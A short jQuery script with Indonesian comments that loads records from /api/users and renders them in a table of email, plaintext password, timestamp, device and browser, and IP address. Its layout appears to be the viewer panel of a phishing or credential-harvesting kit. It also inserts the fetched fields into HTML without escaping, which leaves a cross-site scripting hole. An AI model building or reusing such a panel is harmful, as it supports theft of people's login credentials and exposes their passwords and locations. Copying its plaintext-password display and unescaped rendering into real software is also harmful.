$(document).ready(() => {
  // Fetch data dari API
  $.getJSON("/api/users", (data) => {
    const table = $("#userTable");

    if (data.length === 0) {
      // Jika data kosong
      const emptyRow = `
        <tr>
          <td colspan="5" class="border border-gray-300 px-4 py-2 text-center text-gray-500">
            Masih Kosong.
          </td>
        </tr>
      `;
      table.append(emptyRow);
    } else {
      // Jika data tersedia
      data.forEach((user) => {
        const userAgent = `${user.userAgent.device} (${user.userAgent.type}) - ${user.userAgent.browser} on ${user.userAgent.os}`;
        const row = `
      <tbody>
        <tr class="hover:bg-gray-50">
          <td class="border border-gray-300 px-4 py-2 text-gray-800 sm:text-xs">${user.email}</td>
          <td class="border border-gray-300 px-4 py-2 text-gray-800 sm:text-xs">${user.password}</td>
          <td class="border border-gray-300 px-4 py-2 text-gray-800 sm:text-xs">${user.timestamp}</td>
          <td class="border border-gray-300 px-4 py-2 text-gray-800 sm:text-xs">${userAgent}</td>
          <td class="border border-gray-300 px-4 py-2 text-gray-800 sm:text-xs">${user.ip}</td>
        </tr>
      </tbody>
      `;
        table.append(row);
      });
    }
  }).fail(() => {
    alert("Failed to load user data. Please try again later.");
  });
});
